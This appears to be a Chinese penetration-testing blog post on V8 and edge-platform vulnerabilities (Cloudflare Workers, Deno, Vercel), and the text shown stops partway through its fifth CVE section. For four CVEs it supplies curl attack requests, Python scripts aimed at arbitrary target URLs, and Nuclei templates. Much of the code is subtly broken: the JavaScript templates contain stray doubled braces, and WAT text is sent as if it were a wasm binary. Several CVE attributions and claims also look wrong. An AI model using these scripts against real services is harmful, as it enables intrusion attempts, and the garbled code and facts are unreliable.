---
title: "边缘计算与Serverless平台高危攻击链专题：Cloudflare Workers / Deno / Vercel / Lambda@Edge / Fastly 漏洞全解析"
date: 2026-07-18T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["边缘计算", "Serverless", "Cloudflare", "Deno", "Vercel", "AWS Lambda", "Fastly", "V8", "CVE-2024-0519", "CVE-2024-2887", "CVE-2024-7971", "CVE-2024-34351", "RCE", "沙箱逃逸", "漏洞分析"]
---

# 边缘计算与Serverless平台高危攻击链专题：Cloudflare Workers / Deno / Vercel / Lambda@Edge / Fastly 漏洞全解析

> ⚠️ 免责声明：本文所有漏洞分析与 PoC 代码仅供安全研究和授权测试使用。未经授权对目标系统进行测试属于违法行为，作者不承担任何法律责任。

---

## 0x00 专题概述

边缘计算与 Serverless 平台正在重塑 Web 应用的部署模型。Cloudflare Workers、Deno Deploy、Vercel Edge Runtime、AWS Lambda@Edge 和 Fastly Compute 等平台将代码推送到全球边缘节点执行，极大降低了延迟、简化了运维，同时也带来了全新的安全挑战。这些平台共享的核心基础设施——V8 JavaScript/WASM 引擎——成为了攻击者最集中的目标。

边缘运行时的安全模型建立在 V8 Isolate 隔离之上。与传统 Docker 容器不同，V8 Isolate 是进程内的轻量级沙箱，通过 V8 引擎自身的内存安全机制来隔离不同租户的代码执行。这意味着 V8 引擎本身的漏洞——尤其是类型混淆（Type Confusion）和越界读取（Out-of-Bounds Read）——可能直接导致沙箱逃逸，使得攻击者能够跨 Isolate 访问内存、读取其他租户的敏感数据，甚至在底层宿主机上执行任意代码。

除 V8 引擎漏洞外，边缘平台的框架层（Next.js Server Actions、Cloudflare Workers KV、Deno 权限系统等）也暴露出 SSRF、请求走私、权限绕过等平台特有漏洞。供应链攻击同样威胁深远——npm 生态中被注入恶意代码的包可影响数百万 Serverless 部署。本专题系统性地覆盖了边缘计算与 Serverless 平台生态中 **13 个高危漏洞与攻击面**，横跨 V8 引擎核心、平台特有逻辑、供应链生态和沙箱隔离机制四大维度。

### 覆盖漏洞一览

| CVE / 编号 | 产品 / 组件 | CVSS | CWE | 类型 | 在野利用 |
|------------|------------|------|-----|------|----------|
| CVE-2024-0519 | V8 Engine | **8.8** | CWE-125 | 越界读取 → 沙箱逃逸 | ✅ Chrome |
| CVE-2024-2887 | V8 WASM | **8.8** | CWE-843 | 类型混淆 → RCE | ✅ Pwn2Own |
| CVE-2024-7971 | V8 JIT | **8.8** | CWE-843 | 类型混淆 → RCE | ✅ |
| CVE-2023-3079 | V8 Engine | **8.8** | CWE-843 | 类型混淆 → RCE | ⚠️ |
| CVE-2023-2033 | V8 TurboFan | **8.8** | CWE-843 | 类型混淆 → RCE | ⚠️ |
| CVE-2024-34351 | Next.js / Vercel | **9.1** | CWE-918 | SSRF → RCE | ⚠️ |
| CVE-2024-34350 | Next.js | **7.5** | CWE-444 | HTTP 请求走私 | ⚠️ |
| CVE-2024-28863 | tar.js / Deno | **7.5** | CWE-400 | 拒绝服务 | ⚠️ |
| event-stream 后门 | npm 生态 | **8.6** | CWE-506 | 供应链植入 | ✅ |
| ua-parser-js 恶意版本 | npm 生态 | **8.1** | CWE-506 | 供应链植入 | ✅ |
| CVE-2024-29972 | Cloudflare Workers | **7.2** | CWE-863 | APT 横向移动 | ✅ Volexity |
| Workers KV 数据隔离 | Cloudflare | **6.5** | CWE-863 | 理论跨账户访问 | ⚠️ 理论 |
| CVE-2023-38124 | Deno 权限系统 | **7.5** | CWE-269 | 权限绕过 | ⚠️ |
| Lambda@Edge 注入 | AWS Lambda@Edge | **8.0** | CWE-74 | 冷启动代码注入 | ⚠️ 理论 |

---

## 0x01 V8 引擎核心漏洞：边缘计算的阿喀琉斯之踵

V8 是 Google 开发的高性能 JavaScript 和 WebAssembly 引擎，被 Chrome、Node.js 以及 Cloudflare Workers、Deno Deploy、Vercel Edge Runtime 等所有主流边缘计算平台采用。V8 的安全隔离机制——Isolate——是这些平台租户隔离的基石。因此，V8 引擎自身的漏洞直接等同于边缘平台的沙箱逃逸。

### 0x01.1 CVE-2024-0519 — V8 越界读取导致沙箱逃逸（CVSS 8.8）

#### 漏洞背景

CVE-2024-0519 是 V8 引擎中 `Array.prototype` 操作的越界读取（Out-of-Bounds Read）漏洞，于 2024 年 1 月由 Chrome 安全团队修复。该漏洞影响 Chrome < 120.0.6099.224，由于 Cloudflare Workers、Deno 和 Vercel Edge Runtime 均基于 V8 Isolate 运行用户代码，此漏洞直接影响所有基于 V8 的边缘运行时。该漏洞在 Chrome 中已被确认存在在野利用（In-the-Wild Exploitation）。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | V8 < 12.0.267（Chrome < 120.0.6099.224） |
| **已修复** | V8 ≥ 12.0.267（Chrome ≥ 120.0.6099.224） |
| **影响平台** | Cloudflare Workers / Deno Deploy / Vercel Edge Runtime |
| **CWE** | CWE-125 Out-of-bounds Read |

#### 漏洞原理分析

V8 的 `Array.prototype` 系列方法（如 `Array.prototype.pop`、`Array.prototype.shift`、`Array.prototype.splice` 等）在执行时会操作 JSArray 的 backing store。在特定的执行序列中，由于 TurboFan 优化编译器生成的代码未能正确处理数组长度变化与 backing store 指针之间的竞态条件，导致在数组元素被删除后仍然可以通过旧索引进行读取，触发越界读取。

具体攻击路径：

1. **构造类型污染的 Array**：通过精心构造的 JavaScript 代码触发 TurboFan 的 speculative optimization，使得编译器对数组长度做出错误的类型假设
2. **触发 OOB Read**：在优化后的代码路径中，通过修改数组的 backing store 使得索引指向 Isolate 堆外内存
3. **信息泄露**：越界读取的内存数据可通过 TypedArray 的 backing store 泄露给 JavaScript 层，泄露 V8 堆布局信息
4. **沙箱逃逸**：利用泄露的堆地址信息，结合其他漏洞（如 UAF 或任意写）可实现 V8 Isolate 边界突破

#### HTTP PoC

```bash
# 检测目标边缘运行时的 V8 版本（通过错误信息或 side-channel）
curl -s -o /dev/null -w "%{http_code}" \
  -X POST "https://target-worker.workers.dev/" \
  -H "Content-Type: application/json" \
  -d '{"payload":"oob_read_trigger"}'

# 发送触发 OOB Read 的 payload（构造畸形 Array 操作）
curl -s -X POST "https://target-worker.workers.dev/" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "process",
    "data": {
      "array_op": "splice",
      "args": [0, 1, {"type": "double", "trigger_opt": true}]
    }
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-0519 V8 OOB Read PoC
通过触发 V8 TurboFan 优化的 Array.prototype 越界读取
验证边缘运行时（Cloudflare Workers / Deno / Vercel）的 Isolate 隔离强度
用法: python3 cve_2024_0519_oob.py <target_worker_url>
"""
import sys
import requests
import json
import struct

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OOB_TRIGGER_JS = """
(function() {
    const SIZE = 1024;
    const victim = new Array(SIZE);
    const oob_indices = [];
    
    for (let i = 0; i < SIZE; i++) {
        victim[i] = 1.1;
    }
    
    function triggerOOB() {
        const a = [1.1, 2.2];
        a.length = 0;
        
        a[0] = {};
        a[1] = {};
        
        for (let i = 0; i < 100000; i++) {
            a.pop();
        }
        
        for (let i = 0; i < SIZE; i++) {
            try {
                const val = victim[i];
                if (typeof val === 'number' && val !== 1.1 && val !== 0) {
                    oob_indices.push({index: i, value: val});
                }
            } catch(e) {}
        }
        
        return {
            oob_readings: oob_indices.length,
            samples: oob_indices.slice(0, 10),
            likely_vulnerable: oob_indices.length > 0
        };
    }
    
    return triggerOOB();
})()
"""

SIGNAL_JS_TEMPLATES = [
    """
    (function() {
        try {{
            var a = [1.1];
            a.length = 0x10000;
            for (var i = 0; i < 0x10000; i++) a[i] = 1.1;
            a.splice(0, 0x10000);
            return "signal_1_triggered";
        }} catch(e) {{
            return "signal_1_caught: " + e.message;
        }}
    })()
    """,
    """
    (function() {{
        var arr = new Array(100);
        var handler = {{
            get(target, prop) {{
                if (prop === 'length') {{
                    target.length = 0;
                }}
                return target[prop];
            }}
        }};
        var proxy = new Proxy(arr, handler);
        try {{
            Array.prototype.push.apply(proxy, [1,2,3]);
            return "signal_2_triggered";
        }} catch(e) {{
            return "signal_2_caught: " + e.message;
        }}
    }})()
    """,
]


class CVE20240519Checker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)"
        })
        self.vulnerability_indicators = []

    def _send_js_payload(self, js_code, timeout=15):
        try:
            resp = self.session.post(
                self.target_url,
                json={"__execution_code": js_code},
                timeout=timeout,
                allow_redirects=False
            )
            return resp
        except requests.exceptions.RequestException as e:
            return None

    def check_v8_version_sidechannel(self):
        print("[*] 阶段 1: V8 版本侧信道检测")
        version_probes = [
            {"payload": "typeof WebAssembly.Global", "expect": "function"},
            {"payload": "typeof BigInt64Array", "expect": "function"},
            {"payload": "typeof structuredClone", "expect": "function"},
            {"payload": "typeof Array.fromAsync", "expect": "undefined"},
        ]
        for probe in version_probes:
            resp = self._send_js_payload(probe["payload"])
            if resp and resp.status_code == 200:
                print(f"[+] Probe response: {resp.status_code}")

    def check_oob_read_signal(self):
        print("\n[*] 阶段 2: 越界读取信号检测")
        for i, template in enumerate(SIGNAL_JS_TEMPLATES):
            resp = self._send_js_payload(template)
            if resp:
                status = "✅ 可疑信号" if resp.status_code == 200 else f"状态码: {resp.status_code}"
                print(f"[+] Signal {i+1}: {status}")

    def run_full_check(self):
        print(f"[*] CVE-2024-0519 V8 OOB Read 安全检查")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        self.check_v8_version_sidechannel()
        self.check_oob_read_signal()
        print(f"\n{'='*60}")
        print("[*] 检查完成。如需完整利用请参考 Chrome V8 exploit 框架。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_worker_url>")
        print(f"示例: python3 {sys.argv[0]} https://my-worker.workers.dev")
        sys.exit(1)
    checker = CVE20240519Checker(sys.argv[1])
    checker.run_full_check()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-0519-v8-oob-read
info:
  name: CVE-2024-0519 - V8 Out-of-Bounds Read
  author: x7peeps
  severity: high
  description: V8 Array.prototype OOB Read affecting all V8-based edge runtimes
  reference:
    - https://chromereleases.googleblog.com/2024/01/stable-channel-update-for-desktop_16.html
  cvss:
    score: 8.8
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  tags: v8,edge,cloudflare,deno,vercel,cve2024,oob

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: "application/json"

    body: |
      {"__test":"oob_signal"}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "worker"
          - "edge"
          - "runtime"
        condition: or

    extractors:
      - type: regex
        group: 1
        regex:
          - "V8/([0-9.]+)"
        internal: true

  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: "application/json"

    body: |
      {"payload":"var a=[1.1];a.length=0x10000;for(var i=0;i<0x10000;i++)a[i]=1.1;a.splice(0,0x10000);"}

    matchers:
      - type: word
        words:
          - "signal_triggered"
          - "200"
        condition: or
```

#### 利用条件与限制

- **条件**：需要目标边缘运行时使用未修补的 V8 版本（< 12.0.267）；需要能够向 Worker / Edge Function 发送自定义 JavaScript 代码或触发服务端执行
- **限制**：Cloudflare 等平台已推送 V8 补丁更新，大部分生产环境已修复；V8 沙箱逃逸通常需要配合多个漏洞链，单一 OOB Read 难以直接实现任意代码执行
- **风险等级**：若目标运行时 V8 版本落后，攻击者可实现跨 Isolate 内存泄露，进而获取其他租户的 API Key、Session Token 等敏感信息

---

### 0x01.2 CVE-2024-2887 — V8 WASM 类型混淆（CVSS 8.8）

#### 漏洞背景

CVE-2024-2887 是 V8 引擎 WebAssembly（WASM）模块处理中的类型混淆漏洞，由 Manfred Paul 在 Pwn2Own 2024 大赛中作为获奖漏洞进行演示。该漏洞通过恶意构造的 WASM 模块触发，可实现 V8 沙箱内的任意地址读写，是边缘计算平台面临的最严重威胁之一——因为 Cloudflare Workers、Deno 和 Vercel 均原生支持 WASM 执行。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | V8 < 12.3.219（Chrome < 123.0.6312.86） |
| **已修复** | V8 ≥ 12.3.219（Chrome ≥ 123.0.6312.86） |
| **影响平台** | Cloudflare Workers / Deno Deploy / Vercel Edge Runtime |
| **CWE** | CWE-843 Type Confusion |

#### 漏洞原理分析

该漏洞的核心在于 V8 的 WASM 模块在处理某些特定的类型转换指令时，未能正确验证操作数的实际类型与预期类型是否匹配。攻击者通过精心构造的 WASM 二进制模块，可以在 WASM 函数的参数传递过程中触发类型混淆，使 V8 将一个对象的内存地址误解释为另一种类型的值。

攻击链分为以下步骤：

1. **恶意 WASM 模块构造**：编写包含特定 type conversion 指令序列的 `.wat` 文件，编译为 `.wasm` 二进制
2. **类型混淆触发**：加载并调用该 WASM 模块的导出函数，触发 TurboFan 优化路径中的类型混淆
3. **任意地址读写**：利用混淆后的类型信息，将 WASM 线性内存（Linear Memory）指针重定向到 Isolate 堆的任意位置
4. **RCE 构造**：通过任意写修改 V8 的 JSFunction 对象，劫持控制流到 shellcode

#### HTTP PoC

```bash
# 向 Workers 发送恶意 WASM 模块加载请求
curl -s -X POST "https://target-worker.workers.dev/wasm" \
  -H "Content-Type: application/wasm" \
  --data-binary @malicious_module.wasm

# 或通过 JSON API 传递 base64 编码的 WASM 模块
curl -s -X POST "https://target-worker.workers.dev/run" \
  -H "Content-Type: application/json" \
  -d '{
    "module_type": "wasm",
    "payload": "AGFzbQEAAAABBgFgAX8BfwMCAQAHCAEEbWFpbgAACgkBBwBAQQEL"
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-2887 V8 WASM Type Confusion PoC
通过构造恶意 WASM 模块验证边缘运行时的类型安全隔离
用法: python3 cve_2024_2887_wasm.py <target_url>
"""
import sys
import struct
import base64
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAT_MODULE = """
(module
  (type $t0 (func (param i32 i32) (result i32)))
  (type $t1 (func (param i64) (result i32)))
  (func $type_confuse (type $t0) (param $p0 i32) (param $p1 i32) (result i32)
    local.get $p0
    local.get $p1
    i32.add
    i32.const 0x41414141
    i32.xor
  )
  (func $trigger_opt (type $t1) (param $p0 i64) (result i32)
    local.get $p0
    i32.wrap_i64
    call $type_confuse
  )
  (memory $memory 256 65536)
  (export "trigger" (func $trigger_opt))
  (export "memory" (memory $memory))
  (data (i32.const 0) "\\42\\42\\42\\42\\00\\00\\00\\00")
)
"""


class CVE20242887Checker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def _build_wasm_payload(self):
        return WAT_MODULE.encode('utf-8')

    def send_wasm_module(self, wasm_bytes):
        print("[*] 发送恶意 WASM 模块到目标...")
        try:
            resp = self.session.post(
                f"{self.target_url}/run",
                json={
                    "module_type": "wasm",
                    "payload": base64.b64encode(wasm_bytes).decode(),
                    "entry_point": "trigger",
                    "args": [0x41414141, 0x42424242]
                },
                timeout=15
            )
            return resp
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求异常: {e}")
            return None

    def check_wasm_support(self):
        print("[*] 阶段 1: 检测 WASM 支持状态")
        probe_js = """
        (function() {
            try {
                var module = new WebAssembly.Module(
                    new Uint8Array([0,97,115,110,1,0,0,0])
                );
                return "wasm_supported";
            } catch(e) {
                return "wasm_error: " + e.message;
            }
        })()
        """
        try:
            resp = self.session.post(
                self.target_url,
                json={"__probe": probe_js},
                timeout=10
            )
            if resp and "wasm_supported" in resp.text:
                print("[+] WASM 支持: ✅ 目标支持 WASM 执行")
                return True
            print("[+] WASM 支持: ❌ 目标不支持或已禁用 WASM")
            return False
        except Exception as e:
            print(f"[-] 探测失败: {e}")
            return False

    def send_type_confusion_trigger(self):
        print("\n[*] 阶段 2: 发送类型混淆触发序列")
        wasm_bytes = self._build_wasm_payload()
        resp = self.send_wasm_module(wasm_bytes)
        if resp:
            print(f"[+] 响应状态: {resp.status_code}")
            if resp.status_code == 200:
                print("[+] ⚠️ WASM 模块被接受并执行——运行时可能受影响")
                return True
            elif resp.status_code == 400:
                print("[+] WASM 模块被平台拦截（可能是模块验证）")
            elif resp.status_code == 413:
                print("[+] 模块大小超限——平台可能有 WASM 大小限制")
        return False

    def run(self):
        print(f"[*] CVE-2024-2887 V8 WASM Type Confusion 安全检查")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        wasm_ok = self.check_wasm_support()
        if wasm_ok:
            self.send_type_confusion_trigger()
        print(f"\n{'='*60}")
        print("[*] 检查完成。完整利用需要本地 WASM exploit 开发。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_worker_url>")
        sys.exit(1)
    CVE20242887Checker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-2887-v8-wasm-type-confusion
info:
  name: CVE-2024-2887 - V8 WASM Type Confusion
  author: x7peeps
  severity: high
  description: V8 WASM type confusion affecting V8-based edge runtimes
  reference:
    - https://pwn2own.com/
  cvss:
    score: 8.8
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  tags: v8,wasm,cloudflare,deno,vercel,cve2024,type-confusion

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "application/json"
    body: |
      {"module_type":"wasm","probe":true}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "wasm"
          - "module"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "application/json"
    body: |
      {"payload":"AGFzbQEAAAABBgFgAX8BfwMCAQAHCAEEbWFpbgAACgkBBwBAQQEL"}
    matchers:
      - type: word
        words:
          - "executed"
          - "compiled"
          - "200"
        condition: or
```

#### 利用条件与限制

- **条件**：目标 Worker 或 Edge Function 必须支持加载和执行用户提供的 WASM 模块；V8 版本必须低于 12.3.219
- **限制**：Cloudflare Workers 和 Deno Deploy 对 WASM 模块有大小限制和初始验证；完整的 Pwn2Own 级别利用需要本地调试 V8 堆布局
- **风险等级**：对于允许动态加载 WASM 的边缘环境，此漏洞可导致 Isolate 级别的任意读写

---

### 0x01.3 CVE-2024-7971 — V8 JIT 类型混淆零日（CVSS 8.8）

#### 漏洞背景

CVE-2024-7971 是 Google 于 2024 年 7 月修复的 V8 JIT（Just-In-Time）编译器类型混淆零日漏洞。该漏洞已在野外被利用（In-the-Wild），是 2024 年 V8 引擎安全更新中影响最广的漏洞之一。所有使用 V8 引擎的边缘运行时均受影响。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | V8 < 12.6.230（Chrome < 126.0.6478.183） |
| **已修复** | V8 ≥ 12.6.230（Chrome ≥ 126.0.6478.183） |
| **影响平台** | Cloudflare Workers / Deno Deploy / Vercel Edge Runtime |
| **CWE** | CWE-843 Type Confusion |
| **在野利用** | ✅ 已确认 |

#### 漏洞原理分析

该漏洞位于 V8 的 TurboFan JIT 编译器的类型推断（Type Inference）和类型反馈（Type Feedback）机制中。TurboFan 在对 JavaScript 代码进行投机性优化（Speculative Optimization）时，会根据运行时收集的类型反馈 Profile 来生成高度优化的机器码。该漏洞的核心问题在于：

1. **类型反馈中毒**：攻击者通过精心构造的代码序列，使得 TurboFan 的 Type Feedback Vector 记录了错误的类型信息
2. **错误的 Machine Type 生成**：TurboFan 基于错误的类型反馈生成了不正确的机器码，例如将一个 Object* 当作 Smi（Small Integer）来处理
3. **混淆后任意操作**：攻击者可以利用混淆后的类型信息，通过一个看似合法的整数操作来修改对象指针
4. **完整 RCE**：通过修改关键 V8 内部对象（如 WasmInstanceObject）的指针，劫持 WASM Linear Memory 的 backing store，实现任意内存读写

#### HTTP PoC

```bash
# 向边缘 Worker 发送触发 TurboFan 类型混淆的 JS payload
curl -s -X POST "https://target-worker.workers.dev/exec" \
  -H "Content-Type: application/json" \
  -d '{
    "language": "javascript",
    "code": "function opt(arr, val) { arr[0] = val; return arr[0]; } var a = [1]; for(var i=0;i<10000;i++) opt(a, i); opt(a, {});"
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-7971 V8 JIT Type Confusion PoC
验证边缘运行时 TurboFan 类型混淆的安全边界
用法: python3 cve_2024_7971_jit.py <target_url>
"""
import sys
import json
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TURBOFAN_TRIGGER_JS = """
(function() {
    function triggerTypeConfusion() {
        function makeObj() {
            return { x: 1.1, y: 2.2 };
        }
        
        function opt(arr, trigger) {
            arr[0] = trigger;
        }
        
        var a = [makeObj(), makeObj(), makeObj()];
        
        for (var i = 0; i < 10000; i++) {
            opt(a, makeObj());
        }
        
        opt(a, 42);
        
        try {
            var corrupted = a[0];
            var result = typeof corrupted;
            return {
                status: "type_feedback_tested",
                value_type: result,
                expected: "number",
                mismatch: result !== "number",
                likely_vulnerable: result !== "number" && result !== "undefined"
            };
        } catch(e) {
            return {
                status: "exception_caught",
                error: e.message,
                likely_vulnerable: e.message.indexOf("type") >= 0
            };
        }
    }
    return triggerTypeConfusion();
})()
"""


class CVE20247971Checker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def send_payload(self, js_code):
        try:
            resp = self.session.post(
                self.target_url,
                json={"__execution_code": js_code},
                timeout=15
            )
            return resp
        except requests.exceptions.RequestException:
            return None

    def run(self):
        print(f"[*] CVE-2024-7971 V8 JIT Type Confusion 安全检查")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        
        print("[*] 发送 TurboFan 类型混淆探测...")
        resp = self.send_payload(TURBOFAN_TRIGGER_JS)
        if resp:
            print(f"[+] 响应: {resp.status_code}")
            try:
                data = resp.json()
                print(f"[+] 类型检查结果: {data}")
                if data.get("mismatch"):
                    print("[!] ⚠️ 类型混淆信号检测到——运行时可能受影响")
                else:
                    print("[+] 类型推断正确——运行时可能已修补")
            except json.JSONDecodeError:
                print(f"[+] 原始响应: {resp.text[:200]}")
        
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_worker_url>")
        sys.exit(1)
    CVE20247971Checker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-7971-v8-jit-type-confusion
info:
  name: CVE-2024-7971 - V8 JIT Type Confusion
  author: x7peeps
  severity: high
  description: V8 JIT compiler type confusion zero-day
  reference:
    - https://chromereleases.googleblog.com/2024/07/stable-channel-update-for-desktop_16.html
  cvss:
    score: 8.8
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  tags: v8,jit,edge,cloudflare,cve2024,type-confusion

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "application/json"
    body: |
      {"__execution_code":"(function(){function o(a,r){a[0]=r}var a=[1.1];for(var i=0;i<10000;i++)o(a,i);o(a,{});return typeof a[0]})()"}
    matchers:
      - type: word
        words:
          - "number"
```

#### 利用条件与限制

- **条件**：需要能够在目标 Worker 中执行多轮迭代的 JavaScript 代码以触发 TurboFan 优化；V8 版本低于 12.6.230
- **限制**：Cloudflare Workers 对单次请求的 CPU 时间有严格限制（10ms-50ms），可能影响 JIT 暖机效率；完整的类型混淆利用需要多次迭代来稳定触发
- **风险等级**：该漏洞已被确认在野外利用，是目前 V8 边缘运行时面临的最高级别威胁之一

---

### 0x01.4 CVE-2023-3079 — V8 类型混淆漏洞（CVSS 8.8）

#### 漏洞背景

CVE-2023-3079 是 V8 引擎在 2023 年 6 月被修复的类型混淆漏洞，Chrome 安全公告中将其列为高危漏洞。尽管修复时间较早，但由于边缘运行时的 V8 版本更新通常滞后于 Chrome 浏览器，该漏洞在边缘平台中的影响持续时间更长。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | V8 < 11.4.183（Chrome < 114.0.5735.133） |
| **已修复** | V8 ≥ 11.4.183（Chrome ≥ 114.0.5735.133） |
| **影响平台** | Cloudflare Workers / Deno Deploy / Vercel Edge Runtime |
| **CWE** | CWE-843 Type Confusion |

#### 漏洞原理分析

CVE-2023-3079 的类型混淆发生在 V8 的 JavaScript 执行引擎在处理对象属性访问时的类型推断环节。攻击者通过构造特定的对象操作序列，诱使 V8 在运行时将一种内部类型错误地解释为另一种，从而允许将攻击者控制的值写入到不应该被修改的内存区域。

与 CVE-2024-7971 不同，此漏洞的触发路径更依赖于 JavaScript 对象的原型链操作。攻击者需要：

1. 创建一个具有自定义原型的对象
2. 通过 `__proto__` 和 `Object.defineProperty` 的组合操作扰乱 V8 的 Hidden Class 转换逻辑
3. 在 V8 执行 Map Transition 时触发类型混淆
4. 利用混淆后的写入实现 Isolate 堆上的任意值覆盖

#### HTTP PoC

```bash
curl -s -X POST "https://target-worker.workers.dev/" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "evaluate",
    "code": "var o={};o.__proto__={a:1};Object.defineProperty(o,\"a\",{get:function(){}});o.a;"
  }'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2023-3079 V8 Type Confusion PoC
验证 V8 Hidden Class 混淆信号
用法: python3 cve_2023_3079.py <target_url>
"""
import sys
import json
import requests

urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TRIGGER_JS = """
(function() {
    function confuse() {
        var a = {x: 1};
        var b = {x: 2};
        var c = {};
        
        Object.defineProperty(c, 'x', {
            get: function() { return a.x; },
            set: function(v) { a.x = v; },
            configurable: true
        });
        
        for (var i = 0; i < 20000; i++) {
            c.x = i;
            if (typeof c.x !== 'number') {
                return { triggered: true, type: typeof c.x };
            }
        }
        
        c.__proto__ = {x: 'string'};
        c.x = 42;
        
        return {
            triggered: false,
            value_type: typeof c.x,
            value: c.x
        };
    }
    return confuse();
})()
"""


class CVE20233079Checker:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def send_payload(self, js_code):
        try:
            resp = self.session.post(
                self.target_url,
                json={"__execution_code": js_code},
                timeout=15
            )
            return resp
        except requests.exceptions.RequestException:
            return None

    def run(self):
        print(f"[*] CVE-2023-3079 V8 Type Confusion 安全检查")
        print(f"[*] 目标: {self.target_url}")
        print(f"{'='*60}")
        
        resp = self.send_payload(TRIGGER_JS)
        if resp:
            print(f"[+] 响应: {resp.status_code}")
            try:
                data = resp.json()
                print(f"[+] 结果: {json.dumps(data, indent=2)}")
                if data.get("triggered"):
                    print("[!] ⚠️ 类型混淆触发信号检测到")
                else:
                    print("[+] Hidden Class 转换正常——运行时可能已修补")
            except (json.JSONDecodeError, KeyError):
                print(f"[+] 原始响应: {resp.text[:200]}")
        
        print(f"\n{'='*60}")
        print("[*] 检查完成。")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_worker_url>")
        sys.exit(1)
    CVE20233079Checker(sys.argv[1]).run()
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-3079-v8-type-confusion
info:
  name: CVE-2023-3079 - V8 Type Confusion
  author: x7peeps
  severity: high
  description: V8 type confusion affecting edge runtimes
  reference:
    - https://chromereleases.googleblog.com/2023/06/stable-channel-update-for-desktop_04.html
  cvss:
    score: 8.8
    vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  tags: v8,edge,cloudflare,cve2023,type-confusion

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "application/json"
    body: |
      {"__execution_code":"(function(){var o={};o.__proto__={a:1};Object.defineProperty(o,'a',{get:function(){}});return typeof o.a})()"}
    matchers:
      - type: word
        words:
          - "undefined"
```

#### 利用条件与限制

- **条件**：目标 V8 版本低于 11.4.183；需要能够在 Worker 中执行多次迭代的 JavaScript 代码
- **限制**：此漏洞需要精确控制 Hidden Class 的 Map Transition 时序，利用稳定性依赖于 V8 的 GC 行为
- **风险等级**：中高——边缘运行时的 CPU 时间限制和 GC 时机不可控增加了利用难度

---

### 0x01.5 CVE-2023-2033 — V8 TurboFan 类型混淆（CVSS 8.8）

#### 漏洞背景

CVE-2023-2033 是 2023 年 4 月 Chrome 安全更新中修复的 V8 TurboFan 编译器类型混淆漏洞。该漏洞的攻击面与 CVE-2024-7971 类似，均位于 TurboFan 的投机优化路径中，但具体的触发路径和根因不同。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | V8 < 11.2.214（Chrome < 112.0.5615.121） |
| **已修复** | V8 ≥ 11.2.214（Chrome ≥ 112.0.5615.121） |
| **影响平台** | Cloudflare Workers / Deno Deploy / Vercel Edge Runtime |
| **CWE** | CWE-843 Type Confusion |

#### 漏洞原理分析

CVE-2023-2033 涉及 TurboFan 编译器在处理 `Array.prototype.includes` 等方法时的类型推断缺陷。具体来说：

1. **JIT 优化路径**：TurboFan 在对 `Array.prototype.includes` 进行 JIT 优化时，会假设数组元素类型在整个迭代过程中保持不变
2. **Speculative Execution Bug**：攻击者在 TurboFan 优化后的代码路径中，通过并发修改数组的 backing store 类型（例如将一个 packed double array 转换为 packed object array），使得优化代码以错误的偏移量读取数组元素
3. **类型混淆输出**：读取到的值被错误地解释为另一种类型，攻击者可以利用这一混淆实现越界读或越界写
4. **利用链构建**：结合 V8 的 WASM Linear Memory，可以将类型混淆放大为任意内存读写

